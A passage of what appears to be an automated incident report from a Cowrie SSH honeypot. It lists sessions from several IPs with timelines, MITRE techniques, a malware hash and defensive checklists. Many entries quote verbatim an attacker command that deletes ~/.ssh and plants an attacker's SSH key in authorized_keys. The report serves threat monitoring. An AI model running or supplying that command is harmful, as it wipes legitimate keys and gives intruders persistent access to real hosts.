| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-06-02 10:08 |
| **Last Seen** | 2026-06-02 10:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:08:53` | `cowrie.session.connect` |
| `2026-06-02 10:08:53` | `cowrie.client.version` |
| `2026-06-02 10:08:53` | `cowrie.client.kex` |
| `2026-06-02 10:08:54` | `cowrie.login.success` |
| `2026-06-02 10:08:54` | `cowrie.session.params` |
| `2026-06-02 10:08:54` | `cowrie.command.input` |
| `2026-06-02 10:08:54` | `cowrie.command.failed` |
| `2026-06-02 10:08:54` | `cowrie.log.closed` |
| `2026-06-02 10:08:55` | `cowrie.session.params` |
| `2026-06-02 10:08:55` | `cowrie.command.input` |
| `2026-06-02 10:08:55` | `cowrie.session.file_download` |
| `2026-06-02 10:08:55` | `cowrie.log.closed` |
| `2026-06-02 10:08:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5acf524fffda

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-06-02 10:08 |
| **Last Seen** | 2026-06-02 10:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:08:57` | `cowrie.session.connect` |
| `2026-06-02 10:08:57` | `cowrie.client.version` |
| `2026-06-02 10:08:58` | `cowrie.client.kex` |
| `2026-06-02 10:08:58` | `cowrie.login.success` |
| `2026-06-02 10:08:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1835bd5b42b

| Field | Detail |
|---|---|
| **Source IP** | `212.199.105[.]109` |
| **First Seen** | 2026-06-02 10:09 |
| **Last Seen** | 2026-06-02 10:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:09:28` | `cowrie.session.connect` |
| `2026-06-02 10:09:28` | `cowrie.client.version` |
| `2026-06-02 10:09:28` | `cowrie.client.kex` |
| `2026-06-02 10:09:29` | `cowrie.login.success` |
| `2026-06-02 10:09:29` | `cowrie.session.params` |
| `2026-06-02 10:09:29` | `cowrie.command.input` |
| `2026-06-02 10:09:29` | `cowrie.command.failed` |
| `2026-06-02 10:09:30` | `cowrie.log.closed` |
| `2026-06-02 10:09:30` | `cowrie.session.params` |
| `2026-06-02 10:09:30` | `cowrie.command.input` |
| `2026-06-02 10:09:30` | `cowrie.session.file_download` |
| `2026-06-02 10:09:30` | `cowrie.log.closed` |
| `2026-06-02 10:09:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.199.105[.]109` to AbuseIPDB if not already reported
- [ ] Block `212.199.105[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d71fe8b66fa

| Field | Detail |
|---|---|
| **Source IP** | `212.199.105[.]109` |
| **First Seen** | 2026-06-02 10:09 |
| **Last Seen** | 2026-06-02 10:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:09:33` | `cowrie.session.connect` |
| `2026-06-02 10:09:33` | `cowrie.client.version` |
| `2026-06-02 10:09:33` | `cowrie.client.kex` |
| `2026-06-02 10:09:34` | `cowrie.login.success` |
| `2026-06-02 10:09:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.199.105[.]109` to AbuseIPDB if not already reported
- [ ] Block `212.199.105[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65568e64ccee

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-06-02 10:10 |
| **Last Seen** | 2026-06-02 10:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:10:43` | `cowrie.session.connect` |
| `2026-06-02 10:10:43` | `cowrie.client.version` |
| `2026-06-02 10:10:44` | `cowrie.client.kex` |
| `2026-06-02 10:10:44` | `cowrie.login.success` |
| `2026-06-02 10:10:45` | `cowrie.session.params` |
| `2026-06-02 10:10:45` | `cowrie.command.input` |
| `2026-06-02 10:10:45` | `cowrie.command.failed` |
| `2026-06-02 10:10:45` | `cowrie.log.closed` |
| `2026-06-02 10:10:45` | `cowrie.session.params` |
| `2026-06-02 10:10:45` | `cowrie.command.input` |
| `2026-06-02 10:10:46` | `cowrie.session.file_download` |
| `2026-06-02 10:10:46` | `cowrie.log.closed` |
| `2026-06-02 10:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42d94bde6b48

| Field | Detail |
|---|---|
| **Source IP** | `103.14.33[.]174` |
| **First Seen** | 2026-06-02 10:10 |
| **Last Seen** | 2026-06-02 10:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:10:48` | `cowrie.session.connect` |
| `2026-06-02 10:10:48` | `cowrie.client.version` |
| `2026-06-02 10:10:48` | `cowrie.client.kex` |
| `2026-06-02 10:10:49` | `cowrie.login.success` |
| `2026-06-02 10:10:49` | `cowrie.session.params` |
| `2026-06-02 10:10:49` | `cowrie.command.input` |
| `2026-06-02 10:10:49` | `cowrie.command.failed` |
| `2026-06-02 10:10:49` | `cowrie.log.closed` |
| `2026-06-02 10:10:49` | `cowrie.session.params` |
| `2026-06-02 10:10:49` | `cowrie.command.input` |
| `2026-06-02 10:10:49` | `cowrie.session.file_download` |
| `2026-06-02 10:10:49` | `cowrie.log.closed` |
| `2026-06-02 10:10:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.14.33[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.14.33[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35364ef85c35

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-06-02 10:10 |
| **Last Seen** | 2026-06-02 10:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:10:48` | `cowrie.session.connect` |
| `2026-06-02 10:10:48` | `cowrie.client.version` |
| `2026-06-02 10:10:48` | `cowrie.client.kex` |
| `2026-06-02 10:10:49` | `cowrie.login.success` |
| `2026-06-02 10:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f059b02a869

| Field | Detail |
|---|---|
| **Source IP** | `103.14.33[.]174` |
| **First Seen** | 2026-06-02 10:10 |
| **Last Seen** | 2026-06-02 10:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:10:51` | `cowrie.session.connect` |
| `2026-06-02 10:10:51` | `cowrie.client.version` |
| `2026-06-02 10:10:51` | `cowrie.client.kex` |
| `2026-06-02 10:10:52` | `cowrie.login.success` |
| `2026-06-02 10:10:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.14.33[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.14.33[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d34289e02df

| Field | Detail |
|---|---|
| **Source IP** | `103.14.33[.]174` |
| **First Seen** | 2026-06-02 10:12 |
| **Last Seen** | 2026-06-02 10:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:12:22` | `cowrie.session.connect` |
| `2026-06-02 10:12:22` | `cowrie.client.version` |
| `2026-06-02 10:12:22` | `cowrie.client.kex` |
| `2026-06-02 10:12:23` | `cowrie.login.success` |
| `2026-06-02 10:12:23` | `cowrie.session.params` |
| `2026-06-02 10:12:23` | `cowrie.command.input` |
| `2026-06-02 10:12:23` | `cowrie.command.failed` |
| `2026-06-02 10:12:23` | `cowrie.log.closed` |
| `2026-06-02 10:12:23` | `cowrie.session.params` |
| `2026-06-02 10:12:23` | `cowrie.command.input` |
| `2026-06-02 10:12:23` | `cowrie.session.file_download` |
| `2026-06-02 10:12:23` | `cowrie.log.closed` |
| `2026-06-02 10:12:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.14.33[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.14.33[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6fc1829a4f3

| Field | Detail |
|---|---|
| **Source IP** | `103.14.33[.]174` |
| **First Seen** | 2026-06-02 10:12 |
| **Last Seen** | 2026-06-02 10:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:12:25` | `cowrie.session.connect` |
| `2026-06-02 10:12:25` | `cowrie.client.version` |
| `2026-06-02 10:12:25` | `cowrie.client.kex` |
| `2026-06-02 10:12:26` | `cowrie.login.success` |
| `2026-06-02 10:12:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.14.33[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.14.33[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9efe5913f28d

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-06-02 10:12 |
| **Last Seen** | 2026-06-02 10:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:12:29` | `cowrie.session.connect` |
| `2026-06-02 10:12:29` | `cowrie.client.version` |
| `2026-06-02 10:12:29` | `cowrie.client.kex` |
| `2026-06-02 10:12:30` | `cowrie.login.success` |
| `2026-06-02 10:12:31` | `cowrie.session.params` |
| `2026-06-02 10:12:31` | `cowrie.command.input` |
| `2026-06-02 10:12:31` | `cowrie.command.failed` |
| `2026-06-02 10:12:31` | `cowrie.log.closed` |
| `2026-06-02 10:12:31` | `cowrie.session.params` |
| `2026-06-02 10:12:31` | `cowrie.command.input` |
| `2026-06-02 10:12:32` | `cowrie.session.file_download` |
| `2026-06-02 10:12:32` | `cowrie.log.closed` |
| `2026-06-02 10:12:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-751efa128036

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-06-02 10:12 |
| **Last Seen** | 2026-06-02 10:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:12:34` | `cowrie.session.connect` |
| `2026-06-02 10:12:34` | `cowrie.client.version` |
| `2026-06-02 10:12:34` | `cowrie.client.kex` |
| `2026-06-02 10:12:35` | `cowrie.login.success` |
| `2026-06-02 10:12:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57db5792225d

| Field | Detail |
|---|---|
| **Source IP** | `103.14.33[.]174` |
| **First Seen** | 2026-06-02 10:15 |
| **Last Seen** | 2026-06-02 10:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:15:26` | `cowrie.session.connect` |
| `2026-06-02 10:15:26` | `cowrie.client.version` |
| `2026-06-02 10:15:26` | `cowrie.client.kex` |
| `2026-06-02 10:15:27` | `cowrie.login.success` |
| `2026-06-02 10:15:27` | `cowrie.session.params` |
| `2026-06-02 10:15:27` | `cowrie.command.input` |
| `2026-06-02 10:15:27` | `cowrie.command.failed` |
| `2026-06-02 10:15:27` | `cowrie.log.closed` |
| `2026-06-02 10:15:27` | `cowrie.session.params` |
| `2026-06-02 10:15:27` | `cowrie.command.input` |
| `2026-06-02 10:15:27` | `cowrie.session.file_download` |
| `2026-06-02 10:15:27` | `cowrie.log.closed` |
| `2026-06-02 10:15:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.14.33[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.14.33[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb3f46967df0

| Field | Detail |
|---|---|
| **Source IP** | `103.14.33[.]174` |
| **First Seen** | 2026-06-02 10:15 |
| **Last Seen** | 2026-06-02 10:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:15:29` | `cowrie.session.connect` |
| `2026-06-02 10:15:29` | `cowrie.client.version` |
| `2026-06-02 10:15:29` | `cowrie.client.kex` |
| `2026-06-02 10:15:30` | `cowrie.login.success` |
| `2026-06-02 10:15:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.14.33[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.14.33[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9d65e3cce12

| Field | Detail |
|---|---|
| **Source IP** | `103.14.33[.]174` |
| **First Seen** | 2026-06-02 10:16 |
| **Last Seen** | 2026-06-02 10:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:16:58` | `cowrie.session.connect` |
| `2026-06-02 10:16:58` | `cowrie.client.version` |
| `2026-06-02 10:16:58` | `cowrie.client.kex` |
| `2026-06-02 10:16:59` | `cowrie.login.success` |
| `2026-06-02 10:16:59` | `cowrie.session.params` |
| `2026-06-02 10:16:59` | `cowrie.command.input` |
| `2026-06-02 10:16:59` | `cowrie.command.failed` |
| `2026-06-02 10:16:59` | `cowrie.log.closed` |
| `2026-06-02 10:16:59` | `cowrie.session.params` |
| `2026-06-02 10:16:59` | `cowrie.command.input` |
| `2026-06-02 10:16:59` | `cowrie.session.file_download` |
| `2026-06-02 10:16:59` | `cowrie.log.closed` |
| `2026-06-02 10:17:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.14.33[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.14.33[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-553bac89af4b

| Field | Detail |
|---|---|
| **Source IP** | `103.14.33[.]174` |
| **First Seen** | 2026-06-02 10:17 |
| **Last Seen** | 2026-06-02 10:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:17:01` | `cowrie.session.connect` |
| `2026-06-02 10:17:01` | `cowrie.client.version` |
| `2026-06-02 10:17:01` | `cowrie.client.kex` |
| `2026-06-02 10:17:02` | `cowrie.login.success` |
| `2026-06-02 10:17:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.14.33[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.14.33[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a72f19cded36

| Field | Detail |
|---|---|
| **Source IP** | `103.14.33[.]174` |
| **First Seen** | 2026-06-02 10:18 |
| **Last Seen** | 2026-06-02 10:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:18:29` | `cowrie.session.connect` |
| `2026-06-02 10:18:29` | `cowrie.client.version` |
